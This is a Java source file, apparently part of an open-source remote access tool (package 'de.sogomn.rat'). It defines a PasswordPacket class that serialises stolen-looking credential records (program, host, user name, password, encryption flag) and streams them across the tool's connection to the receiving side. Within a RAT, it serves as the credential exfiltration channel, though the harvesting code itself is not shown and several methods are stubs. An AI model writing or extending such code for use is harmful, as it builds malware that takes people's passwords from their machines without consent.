/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;

public final class PasswordPacket extends AbstractPingPongPacket {
	
	private Password[] passwords;
	
	private static final byte END = 0;
	private static final byte INCOMING = 1;
	private static final byte ENCRYPTED = 0;
	private static final byte PLAIN = 1;
	
	public PasswordPacket(final Password... passwords) {
		this.passwords = passwords;
	}
	
	public PasswordPacket() {
		passwords = new Password[0];
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		for (final Password password : passwords) {
			final byte flag = password.encrypted ? ENCRYPTED : PLAIN;
			
			connection.writeByte(INCOMING);
			connection.writeUtf(password.program);
			connection.writeUtf(password.host);
			connection.writeUtf(password.user);
			connection.writeUtf(password.password);
			connection.writeByte(flag);
		}
		
		connection.writeByte(END);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final ArrayList<Password> passwordList = new ArrayList<Password>();
		
		while (connection.readByte() == INCOMING) {
			final String program = connection.readUtf();
			final String host = connection.readUtf();
			final String user = connection.readUtf();
			final String password = connection.readUtf();
			final byte flag = connection.readByte();
			final boolean encrypted = flag == ENCRYPTED;
			final Password receivedPassword = new Password(program, host, user, password, encrypted);
			
			passwordList.add(receivedPassword);
		}
		
		final int size = passwordList.size();
		
		passwords = new Password[size];
		passwords = passwordList.toArray(passwords);
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public Password[] getPasswords() {
		return passwords;
	}
	
	public static final class Password {
		
		private String program, host, user, password;
		private boolean encrypted;
		
		public Password(final String program, final String host, final String user, final String password, final boolean encrypted) {
			this.program = program;
			this.host = host;
			this.user = user;
			this.password = password;
			this.encrypted = encrypted;
		}
		
	}
	
}
